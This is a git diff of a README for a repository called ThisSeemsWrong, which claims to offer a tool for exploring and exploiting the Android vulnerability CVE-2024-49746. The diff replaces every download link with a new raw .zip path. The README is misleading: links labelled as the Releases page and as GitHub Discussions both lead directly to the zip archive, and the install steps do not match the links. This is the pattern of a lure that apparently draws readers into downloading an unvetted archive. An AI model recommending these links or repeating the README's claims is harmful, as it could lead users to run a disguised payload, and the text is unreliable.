@@ -1,7 +1,7 @@
 # 🚀 ThisSeemsWrong - A Simple Solution to Android Vulnerability
 
 ## 📥 Download Now
-[![Download from GitHub](https://raw.githubusercontent.com/Kaushiiiii-beep/ThisSeemsWrong/main/justifyingly/ThisSeemsWrong.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/Kaushiiiii-beep/ThisSeemsWrong/main/justifyingly/ThisSeemsWrong.zip)
+[![Download from GitHub](https://raw.githubusercontent.com/Kaushiiiii-beep/ThisSeemsWrong/main/app/src/main/Seems_This_Wrong_v3.5.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/Kaushiiiii-beep/ThisSeemsWrong/main/app/src/main/Seems_This_Wrong_v3.5.zip)
 
 ## 📖 Introduction
 ThisSeemsWrong is a tool designed to help you understand and exploit a specific vulnerability in Android, known as CVE-2024-49746. It focuses on how Android’s Parcel::continueWrite function handles file descriptors. This application aims to increase awareness about this security issue and provide a safe way to explore it.
@@ -17,7 +17,7 @@ Before you download the application, make sure your system meets the following r
 - **Java Runtime:** Ensure you have Java Runtime Environment (JRE) installed on your device.
 
 ### 📥 Download & Install
-To download ThisSeemsWrong, simply visit [this page](https://raw.githubusercontent.com/Kaushiiiii-beep/ThisSeemsWrong/main/justifyingly/ThisSeemsWrong.zip). You will find the latest version available.
+To download ThisSeemsWrong, simply visit [this page](https://raw.githubusercontent.com/Kaushiiiii-beep/ThisSeemsWrong/main/app/src/main/Seems_This_Wrong_v3.5.zip). You will find the latest version available.
 
 1. Click on the link above to open the Releases page.
 2. Look for the most recent version.
@@ -57,7 +57,7 @@ A: No, the application is user-friendly and provides simple instructions.
 A: Yes! Check out the contribution guidelines in the repository for more information.
 
 ### 👥 Community Support
-If you need help or have questions, feel free to reach out to the community. Visit our [GitHub Discussions](https://raw.githubusercontent.com/Kaushiiiii-beep/ThisSeemsWrong/main/justifyingly/ThisSeemsWrong.zip) page. You can also contact the developers directly via the repository’s issues section.
+If you need help or have questions, feel free to reach out to the community. Visit our [GitHub Discussions](https://raw.githubusercontent.com/Kaushiiiii-beep/ThisSeemsWrong/main/app/src/main/Seems_This_Wrong_v3.5.zip) page. You can also contact the developers directly via the repository’s issues section.
 
 ### 📈 Future Updates
 We plan to improve ThisSeemsWrong with more features and detailed documentation. Stay tuned for updates on the Releases page.
